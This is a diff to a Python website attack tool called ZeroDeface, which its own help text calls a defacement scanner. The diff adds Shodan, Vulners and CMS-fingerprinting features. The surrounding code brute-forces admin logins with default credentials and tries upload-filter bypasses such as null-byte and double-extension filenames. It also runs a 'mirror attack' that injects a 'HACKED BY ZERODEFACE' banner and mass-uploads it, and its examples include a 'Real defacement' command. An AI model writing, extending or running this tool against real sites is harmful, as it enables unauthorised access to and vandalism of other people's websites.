@@ -12,6 +12,20 @@ import sys
 import re
 import threading
 from queue import Queue
+from packaging import version as pkg_version
+
+# Optional .env file support
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    pass
+
+# Shodan integration
+try:
+    import shodan
+except ImportError:
+    shodan = None
 
 args = None 
 requests.packages.urllib3.disable_warnings()
@@ -115,77 +129,150 @@ echo "</body></html>";
 
         # File extensions and content types for bypass attempts
         self.upload_test_cases = [
-            # Normal extensions
             ('index.html', 'text/html'),
             ('index.php', 'application/x-php'),
             ('test.htm', 'text/html'),
-            
-            # Double extensions
             ('test.html.jpg', 'image/jpeg'),
             ('image.php.png', 'image/png'),
             ('file.html.gif', 'image/gif'),
-            
-            # Null byte injections
             ('shell.php%00.jpg', 'image/jpeg'),
             ('test.html%00.png', 'image/png'),
-            
-            # Case manipulation
             ('Index.HtMl', 'text/html'),
             ('INDEX.PHP', 'application/x-php'),
-            
-            # Extra extensions
             ('test.php.jpg', 'image/jpeg'),
             ('test.php.test', 'text/plain'),
-            
-            # CMS-specific
             ('wp-config.php', 'application/x-php'),
             ('configuration.php', 'application/x-php')
         ]
 
+    def query_shodan(self):
+        """Query Shodan for information about the target host"""
+        if not shodan:
+            print("[-] Shodan library not installed. Install with: pip install shodan")
+            return
+            
+        api_key = os.getenv("SHODAN_API_KEY")
+        if not api_key:
+            print("[-] SHODAN_API_KEY not set. Skipping Shodan scan.")
+            return
+            
+        try:
+            # Extract host from target URL
+            parsed = requests.utils.urlparse(self.target_url)
+            host = parsed.netloc.split(':')[0]
+            
+            print(f"[*] Querying Shodan for host: {host}")
+            
+            api = shodan.Shodan(api_key)
+            host_info = api.host(host)
+            
+            print(f"\n[+] Shodan Results for {host}:")
+            print(f"IP: {host_info['ip_str']}")
+            print(f"Organization: {host_info.get('org', 'N/A')}")
+            print(f"Operating System: {host_info.get('os', 'N/A')}")
+            print("\nOpen Ports:")
+            
+            for item in host_info['data']:
+                port = item['port']
+                product = item.get('product', 'N/A')
+                version = item.get('version', 'N/A')
+                banner = item.get('data', '').split('\n')[0][:100]
+                
+                print(f"  {port}/tcp - {product} {version}")
+                if banner:
+                    print(f"    Banner: {banner}")
+                
+                self.log_vulnerability(
+                    "Shodan Open Port",
+                    f"Open port found: {port}/tcp - {product} {version}",
+                    proof=banner if banner else "No banner information"
+                )
+                
+        except shodan.APIError as e:
+            print(f"[-] Shodan API error: {e}")
+        except Exception as e:
+            print(f"[-] Error querying Shodan: {e}")
+
+    def query_vulners(self, cms, version):
+        """Query Vulners API for known CVEs related to the CMS version"""
+        api_key = os.getenv("VULNERS_API_KEY")
+        if not api_key:
+            print("[-] VULNERS_API_KEY not set. Skipping Vulners scan.")
+            return []
+        
+        try:
+            query = f"{cms} {version}"
+            headers = {
+                'Content-Type': 'application/json',
+                'User-Agent': 'ZeroDeface/3.2'
+            }
+            
+            payload = {
+                "query": query,
+                "size": 10,
+                "apiKey": api_key
+            }
+            
+            response = requests.post(
+                "https://vulners.com/api/v3/search/lucene/",
+                json=payload,
+                headers=headers,
+                timeout=15
+            )
+            response.raise_for_status()
+            
+            data = response.json()
+            vulnerabilities = []
+            
+            if data.get('data', {}).get('search'):
+                for item in data['data']['search']:
+                    title = item.get('_source', {}).get('title', 'Unknown')
+                    cvelist = item.get('_source', {}).get('cvelist', [])
+                    cve = cvelist[0] if cvelist else 'No-CVE'
+                    href = item.get('_source', {}).get('href', 'No URL')
+                    published = item.get('_source', {}).get('published', 'Unknown date')
+                    
+                    self.log_vulnerability(
+                        category="Known CVE",
+                        description=f"{title} ({cve})",
+                        exploit=href,
+                        proof=f"Published: {published}"
+                    )
+                    vulnerabilities.append(cve)
+            
+            return vulnerabilities
+            
+        except Exception as e:
+            if args.verbose:
+                print(f"[-] Vulners API error: {str(e)}")
+            return []
+
     def _load_admin_paths(self):
         """Load comprehensive list of admin paths for all major CMS"""
         paths = [
-            # Generic admin paths
             'admin', 'administrator', 'backend', 'manager', 'panel',
             'adminpanel', 'admincp', 'admin_area', 'controlpanel',
             'moderator', 'webadmin', 'sysadmin', 'admin123',
             'admin/admin', 'admin/login', 'admin_area/admin',
-            
-            # WordPress
             'wp-admin', 'wp-login.php', 'wp-admin/admin-ajax.php',
             'wordpress/wp-admin', 'blog/wp-admin',
-            
-            # Joomla
             'administrator', 'joomla/administrator',
             'administrator/index.php', 'admin/index.php',
-            
-            # Drupal
             'user/login', 'admin', 'admin/config',
             'admin/content', 'admin/modules',
-            
-            # Magento
             'adminhtml', 'admin/login', 'admin/dashboard',
-            
-            # OpenCart
             'admin', 'admin/index.php?route=common/dashboard',
-            
-            # Other CMS
             'bolt/login', 'concrete5/login', 'prestashop/admin',
             'umbraco/', 'sitecore/login', 'orchard/admin',
-            
-            # API endpoints
             'api/admin', 'rest/admin', 'graphql/admin',
-            
-            # Version specific
             'admin2023', 'admin2024', 'admin2025',
             'admin_v2', 'admin_new', 'admin_old'
         ]
         
-        # Add numbered variations
         paths.extend([f'admin{i}' for i in range(1, 10)])
         paths.extend([f'administrator{i}' for i in range(1, 5)])
         
-        return list(set(paths))  # Remove duplicates
+        return list(set(paths))
 
     def _load_credentials(self):
         """Load comprehensive default credentials database"""
@@ -219,6 +306,13 @@ echo "</body></html>";
             ]
         }
 
+    def check_cms_vulnerabilities(self, cms, version_detected):
+        """Check for known vulnerabilities in the detected CMS version"""
+        if not version_detected:
+            return []
+            
+        return self.query_vulners(cms, version_detected)
+
     def print_banner(self):
         banner = r"""
 __________                 ________          _____                     
@@ -235,7 +329,7 @@ __________                 ________          _____
     def show_menu(self):
         print("""\033[33m
 █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-█                                     𝗠𝗘𝗡𝗨                                                                    
+█                                     𝗠𝗘𝗡𝗨                                                                     
 █=====================================================================================█
 █ 1.  Scan Entire Website             | 9.  Test File Upload Vulnerabilities          █
 █ 2.  Scan for Admin Panels           | 10. Attempt Defacement                       █
@@ -244,7 +338,8 @@ __________                 ________          _____
 █ 5.  Scan Other Vulnerabilities      | 13. Cleanup Test Files                       █
 █ 6.  Detect CMS                      | 14. List Discovered URLs                     █  
 █ 7.  Test WebDAV                     | 15. Show Vulnerability Log                   █
-█ 8.  Check Common Files              | 16. Exit                                     █
+█ 8.  Check Common Files              | 16. Fingerprint CMS & Files                  █
+█ 17. Exit                            |                                               █
 █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 \033[0m""")
 
@@ -294,20 +389,20 @@ __________                 ________          _____
                 for vuln in self.vulnerabilities:
                     print(f"{vuln['category']}: {vuln['description']}")
             elif choice == "16":
+                self.scan_outdated_software_and_exposed_files()
+            elif choice == "17":
                 print("[*] Exiting ZeroDeface...")
                 break
             else:
-                print("[-] Invalid choice. Please select 1-16")
+                print("[-] Invalid choice. Please select 1-17")
             
-            # Pause before showing menu again
-            if choice != "16":
+            if choice != "17":
                 input("\nPress Enter to return to menu...")
-                print("\033[F\033[K", end="")  # Move cursor up and clear line
+                print("\033[F\033[K", end="")
 
     def upload_file(self, url, content):
         """Attempt to upload a file to the target URL"""
         try:
-            # Try PUT method first (common in WebDAV)
             response = self.session.put(
                 url,
                 data=content,
@@ -319,7 +414,6 @@ __________                 ________          _____
             if response.status_code in [200, 201, 204]:
                 return True
             
-            # If PUT fails, try POST (for form-based uploads)
             files = {'file': ('index.html', content)}
             response = self.session.post(
                 url,
@@ -340,18 +434,15 @@ __________                 ________          _____
         try:
             print("\n[+] Starting Mirror Attack...")
             
-            # 1. Clone the target page
             response = self.session.get(self.target_url, verify=False, timeout=15)
             original_html = response.text
             
-            # 2. Inject defacement
             defacement = """
             <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:20px;text-align:center;z-index:9999;">
             HACKED BY ZERODEFACE</div>
             """
             modified_html = original_html.replace('</body>', f'{defacement}</body>')
             
-            # 3. Find upload locations
             upload_paths = [
                 'wp-content/uploads',
                 'images', 
@@ -360,7 +451,6 @@ __________                 ________          _____
                 'media'
             ]
             
-            # 4. Mass upload
             for path in upload_paths:
                 upload_url = urljoin(self.target_url, path + "/index.html")
                 if self.upload_file(upload_url, modified_html):
@@ -411,7 +501,6 @@ __________                 ________          _____
                 if re.search(pattern, content, re.IGNORECASE):
                     return cms
                     
-        # Check headers
         if 'x-powered-by' in headers:
             if 'wordpress' in headers:
                 return 'WordPress'
@@ -427,7 +516,6 @@ __________                 ________          _____
         print("[*] Scanning for admin panels with deep CMS detection...")
         found = False
         
-        # First get homepage to detect CMS
         try:
             self.rate_limit()
             response = self.session.get(self.target_url, verify=False, timeout=15)
@@ -437,7 +525,6 @@ __________                 ________          _____
             print(f"[-] Error detecting CMS: {e}")
             cms = 'Unknown'
         
-        # Check CMS-specific admin paths first
         cms_paths = {
             'WordPress': ['wp-admin', 'wp-login.php'],
             'Joomla': ['administrator'],
@@ -446,7 +533,6 @@ __________                 ________          _____
             'OpenCart': ['admin']
         }.get(cms, [])
         
-        # Test all paths with priority to detected CMS
         for path in cms_paths + self.admin_paths:
             if self.stop_flag:
                 break
@@ -488,13 +574,11 @@ __________                 ________          _____
         content = response.text.lower()
         soup = BeautifulSoup(response.text, 'html.parser')
         
-        # Check for login forms
         login_form = soup.find('form') and (
             soup.find('input', {'type': 'password'}) or
             any(x in content for x in ['login', 'sign in', 'password'])
         )
         
-        # Check for admin indicators
         admin_indicators = [
             'dashboard', 'control panel', 'admin area',
             'wp-admin', 'administrator', 'cms', 'manager',
@@ -503,7 +587,6 @@ __________                 ________          _____
         ]
         admin_content = any(indicator in content for indicator in admin_indicators)
         
-        # Check page title
         title = soup.find('title')
         admin_title = title and any(
             word in title.text.lower() 
@@ -529,7 +612,6 @@ __________                 ________          _____
                 break
                 
             try:
-                # Try both form and JSON login
                 for payload in [
                     {'username': username, 'password': password, 'login': 'submit'},
                     {'user': username, 'pass': password, 'submit': 'login'},
@@ -560,12 +642,10 @@ __________                 ________          _____
 
     def is_login_successful(self, response, original_url):
         """Determine if login attempt was successful"""
-        # Check for redirect to different page
         if response.status_code in [301, 302]:
             if response.headers.get('Location') and response.headers['Location'] != original_url:
                 return True
                 
-        # Check content for success indicators
         content = response.text.lower()
         success_indicators = [
             'logout', 'dashboard', 'welcome', 'my account',
@@ -578,15 +658,12 @@ __________                 ________          _____
         """Extract relevant evidence from admin page"""
         soup = BeautifulSoup(response.text, 'html.parser')
         
-        # Get page title
         title = soup.find('title')
         title_text = title.text if title else 'No title found'
         
-        # Get forms
         forms = soup.find_all('form')
         form_info = [f"Form action: {form.get('action', '')}" for form in forms[:2]]
         
-        # Get meta generator
         meta = soup.find('meta', {'name': 'generator'})
         meta_info = f"Generator: {meta['content']}" if meta else ''
         
@@ -598,14 +675,12 @@ __________                 ________          _____
         self.discovered_urls.add(self.target_url)
         self.crawl_queue.put(self.target_url)
         
-        # Start crawl threads
         for i in range(args.threads):
             t = threading.Thread(target=self._crawl_worker)
             t.daemon = True
             t.start()
             self.threads.append(t)
             
-        # Wait for crawling to complete
         self.crawl_queue.join()
         self.stop_flag = True
         
@@ -625,7 +700,6 @@ __________                 ________          _____
                     response = self.session.get(url, verify=False, timeout=10)
                     soup = BeautifulSoup(response.text, 'html.parser')
                     
-                    # Find all links
                     for link in soup.find_all('a', href=True):
                         if self.stop_flag:
                             break
@@ -638,7 +712,6 @@ __________                 ________          _____
                                     self.discovered_urls.add(absolute_url)
                                     self.crawl_queue.put(absolute_url)
                                     
-                                    # Check if this is an admin page
                                     if 'admin' in absolute_url.lower() or 'login' in absolute_url.lower():
                                         try:
                                             self.rate_limit()
@@ -671,7 +744,6 @@ __________                 ________          _____
         print("[*] Scanning for file upload vulnerabilities with advanced techniques...")
         found = False
         
-        # 1. Check standard file upload forms
         forms = self.crawl_for_forms()
         for form in forms:
             if form.find('input', {'type': 'file'}):
@@ -684,7 +756,6 @@ __________                 ________          _____
                     if args.deface:
                         self.attempt_defacement(action, method)
         
-        # 2. Check common upload paths
         common_upload_paths = [
             'upload', 'file-upload', 'upload-file', 'admin/upload',
             'wp-content/plugins/formcraft/file-upload/server/php/',
@@ -728,7 +799,6 @@ __________                 ________          _____
         print("[*] Testing file upload with advanced techniques...")
         
         for filename, content_type in self.upload_test_cases:
-            # Generate content based on file type
             if filename.endswith('.php'):
                 content = '<?php echo "ZERODEFACE_TEST: " . $_SERVER["HTTP_HOST"]; ?>'
             else:
@@ -738,7 +808,6 @@ __________                 ________          _____
                 files = {'file': (filename, content, content_type)}
                 data = {'submit': 'upload', 'id': 'test123'}
                 
-                # Add extra headers for bypass attempts
                 headers = {
                     'X-Forwarded-For': '127.0.0.1',
                     'Referer': self.target_url
@@ -765,7 +834,6 @@ __________                 ________          _____
                         timeout=15
                     )
                 
-                # Check if upload was successful
                 if response.status_code in [200, 201, 302]:
                     file_url = self.find_uploaded_file(response, filename)
                     if file_url:
@@ -790,10 +858,8 @@ __________                 ________          _____
 
     def find_uploaded_file(self, response, filename):
         """Determine URL of uploaded file"""
-        # Try simple URL join first
         file_url = urljoin(response.url, filename)
         
-        # Check if URL exists
         try:
             self.rate_limit()
             test_response = self.session.head(file_url, verify=False, timeout=5)
@@ -802,7 +868,6 @@ __________                 ________          _____
         except:
             pass
             
-        # Try to find link in response
         soup = BeautifulSoup(response.text, 'html.parser')
         for link in soup.find_all('a', href=True):
             if filename in link['href']:
@@ -832,7 +897,6 @@ curl {urljoin(url, filename)}"""
         
         print("[*] Attempting defacement...")
         
-        # Try multiple defacement approaches
         for filename, content_type in [
             ('index.html', 'text/html'),
             ('index.php', 'application/x-php'),
@@ -847,7 +911,6 @@ curl {urljoin(url, filename)}"""
                     self.defacement_success = True
                     return True
                 
-                # Real upload attempt
                 files = {'file': (filename, content, content_type)}
                 data = {'submit': 'upload'}
                 
@@ -881,21 +944,18 @@ curl {urljoin(url, filename)}"""
         """Complete site scanning including crawling"""
         print("[*] Starting comprehensive site scan...")
         
-        # Phase 1: Crawl the site
         if args.crawl:
             self.crawl_website()
         
-        # Phase 2: Admin panel detection
         if args.admin or args.all:
             self.scan_admin_panels()
         
-        # Phase 3: File upload tests
         if args.upload or args.all:
             self.scan_upload_vulnerabilities()
         
-        # Phase 4: Other vulnerability checks
         if args.all:
             self.scan_other_vulnerabilities()
+            self.scan_outdated_software_and_exposed_files()
             
         print("[*] Comprehensive scan completed")
 
@@ -903,7 +963,6 @@ curl {urljoin(url, filename)}"""
         """Scan for other common vulnerabilities"""
         print("[*] Scanning for other common vulnerabilities...")
         
-        # Check for common files
         common_files = [
             'robots.txt', '.git/config', '.env',
             'phpinfo.php', 'test.php', 'info.php'
@@ -956,6 +1015,107 @@ curl {urljoin(url, filename)}"""
         self.session.close()
         self.stop_flag = True
 
+    def scan_outdated_software_and_exposed_files(self):
+        """Scan for outdated CMS versions, exposed files, and missing security headers."""
+        print("[*] Scanning for outdated CMS, exposed files, and misconfigurations...")
+        try:
+            response = self.session.get(self.target_url, verify=False, timeout=15)
+            cms = self.detect_cms(response)
+            cms_version = self.detect_cms_version(response, cms)
+            
+            if cms != 'Unknown CMS' and cms_version:
+                vulns = self.check_cms_vulnerabilities(cms, cms_version)
+                if vulns:
+                    self.log_vulnerability(
+                        "Outdated CMS Detected",
+                        f"{cms} version {cms_version} is outdated or vulnerable.",
+                        proof="Known CVEs: " + ", ".join(vulns)
+                    )
+                else:
+                    print(f"[+] {cms} version {cms_version} appears up to date.")
+            
+            sensitive_files = [
+                'phpinfo.php', 'test.php', '.git/config', '.env', 
+                'backup.zip', 'config.php~', 'wp-config.php.bak',
+                'database.sql', 'dump.sql', 'backup.tar.gz',
+                'error_log', 'access.log', '.htpasswd'
+            ]
+            
+            for file in sensitive_files:
+                url = urljoin(self.target_url, file)
+                try:
+                    res = self.session.head(url, verify=False, timeout=10)
+                    if res.status_code == 200:
+                        if int(res.headers.get('Content-Length', 0)) < 100000:
+                            res = self.session.get(url, verify=False, timeout=10)
+                            self.log_vulnerability(
+                                "Exposed Sensitive File",
+                                f"File exposed: {url}",
+                                proof=res.text[:200] + ("..." if len(res.text) > 200 else "")
+                            )
+                        else:
+                            self.log_vulnerability(
+                                "Exposed Sensitive File",
+                                f"Large file exposed: {url} (Size: {res.headers.get('Content-Length')} bytes)"
+                            )
+                except:
+                    continue
+            
+            security_headers = {
+                'Content-Security-Policy': "Prevents XSS attacks",
+                'Strict-Transport-Security': "Enforces HTTPS",
+                'X-Content-Type-Options': "Prevents MIME sniffing",
+                'X-Frame-Options': "Prevents clickjacking",
+                'X-XSS-Protection': "XSS protection"
+            }
+            
+            for header, purpose in security_headers.items():
+                if header not in response.headers:
+                    self.log_vulnerability(
+                        "Missing Security Header",
+                        f"{header} is missing ({purpose}) on {self.target_url}"
+                    )
+                elif header == 'Content-Security-Policy' and "unsafe-inline" in response.headers[header]:
+                    self.log_vulnerability(
+                        "Insecure CSP Policy",
+                        f"Content-Security-Policy allows unsafe-inline scripts"
+                    )
+                    
+        except Exception as e:
+            print(f"[-] Error during fingerprint scan: {e}")
+
+    def detect_cms_version(self, response, cms):
+        """Attempt to detect CMS version via meta generator tag or other indicators."""
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        meta = soup.find('meta', attrs={'name': 'generator'})
+        if meta and cms.lower() in meta.get('content', '').lower():
+            version_match = re.search(r'\d+(\.\d+)+', meta['content'])
+            if version_match:
+                return version_match.group(0)
+        
+        if cms == 'WordPress':
+            try:
+                readme = self.session.get(urljoin(self.target_url, 'readme.html'), verify=False, timeout=5)
+                if readme.status_code == 200:
+                    version_match = re.search(r'Version (\d+\.\d+(\.\d+)?)', readme.text)
+                    if version_match:
+                        return version_match.group(1)
+            except:
+                pass
+        
+        if cms == 'Joomla':
+            try:
+                manifest = self.session.get(urljoin(self.target_url, 'administrator/manifests/files/joomla.xml'), verify=False, timeout=5)
+                if manifest.status_code == 200:
+                    version_match = re.search(r'<version>(\d+\.\d+\.\d+)</version>', manifest.text)
+                    if version_match:
+                        return version_match.group(1)
+            except:
+                pass
+        
+        return None
+
 def main():
     parser = argparse.ArgumentParser(
         description='ZeroDeface Ultimate v3.2 - Complete Website Defacement Scanner',
@@ -967,7 +1127,9 @@ Examples:
   Upload test:     python deface_scanner.py --url http://example.com --upload --deface --simulate
   Real defacement: python deface_scanner.py --url http://example.com --upload --deface
   Mirror attack:   python deface_scanner.py --url http://example.com --mirror
+  Fingerprint:     python deface_scanner.py --url http://example.com --fingerprint
   Interactive:     python deface_scanner.py --url http://example.com --interactive
+  Shodan scan:     python deface_scanner.py --url http://example.com --shodan
 \033[0m"""
     )
     
@@ -980,6 +1142,8 @@ Examples:
     parser.add_argument('--simulate', action='store_true', help='Safe simulation mode (no real changes)')
     parser.add_argument('--crawl', action='store_true', help='Crawl the entire site')
     parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
+    parser.add_argument('--fingerprint', action='store_true', help='Scan for outdated software and exposed files')
+    parser.add_argument('--shodan', action='store_true', help='Query Shodan for host information')
     parser.add_argument('--report', help='Save results to JSON file')
     parser.add_argument('--verbose', action='store_true', help='Show detailed scan progress')
     parser.add_argument('--quiet', action='store_true', help='Only show critical findings')
@@ -1013,6 +1177,10 @@ Examples:
                     scanner.crawl_website()
                 if args.mirror:
                     scanner.mirror_attack()
+                if args.fingerprint:
+                    scanner.scan_outdated_software_and_exposed_files()
+                if args.shodan:
+                    scanner.query_shodan()
                 
             if args.report:
                 scanner.generate_report(args.report)
